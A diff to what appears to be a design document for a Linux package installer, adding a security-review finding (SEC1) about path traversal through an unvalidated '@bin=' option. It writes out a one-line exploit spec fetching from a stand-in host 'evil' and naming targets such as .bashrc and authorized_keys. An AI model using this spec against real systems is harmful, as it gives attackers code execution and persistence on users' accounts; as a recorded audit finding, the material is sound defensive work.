@@ -1253,6 +1253,30 @@ implementing agent's call; that it goes is not.**
   compensate started-but-not-completed nodes, or make an `Abandoned` entry still trigger a heal/warn
   rather than dropping it from recovery.
 
+### Security — the 2026-07-17 review pass (PROBLEMS RECORDED, solutions NOT yet decided)
+
+Unlike R1–R23 above (owner-approved fixes), these are **recorded vulnerabilities awaiting a
+solution decision**. Do not implement a fix until the owner rules on the approach. A pass 5
+security review confirmed the core is sound — every package-manager command is built as argv
+(no `sh -c`, no `format!`-into-shell), the II.12 hook-approval ledger is enforced on every
+hook-exec path, sudo is argv not a string, and archive extraction rejects `..`/absolute members.
+The problems are in the download/link backends, where a pasted `web:`/`appimage:`/`github:`/`link:`
+spec carries untrusted URLs and `@`-options to the filesystem with no validation.
+
+- **SEC1 — VERY SERIOUS. `@bin` path traversal → code execution on next login (web backend).**
+  `bin_name` comes straight from the `@bin=` option, unsanitized, and is joined into
+  `~/.local/bin/<bin_name>` (`web.rs:168-178`); LiNix then removes whatever sits at that path and
+  symlinks it to the downloaded, attacker-controlled file (`web.rs:209-226`). The value is never
+  validated — the grammar checks only the option *key* (`config/grammar/options.rs`), not the value.
+  **Exploit, one pasted line:** `web:http://evil/payload @bin=../../.bashrc` resolves the destination
+  to `~/.bashrc` and drops a symlink there pointing at the attacker's file; the next shell start
+  sources it and runs code. `@bin=../../.ssh/authorized_keys`, `../../.config/autostart/x.desktop`,
+  `../../.config/systemd/user/…` all work identically. It is user-level (not root), but it is a clean
+  single-line RCE from a copied install spec, and it fires **even when the download is HTTPS and
+  checksummed** — the traversal is in the destination, not the source. Reachable, high confidence.
+  **Solution TBD** (candidates: reject `@bin`/`@target` values containing a path separator or `..`;
+  or resolve the final path and refuse if it escapes `~/.local/bin`). Do not implement until decided.
+
 ## Phase 6 — The five containers
 
 `DISTROS="ubuntu fedora arch alpine tools" ./docker/integration/run.sh jq`
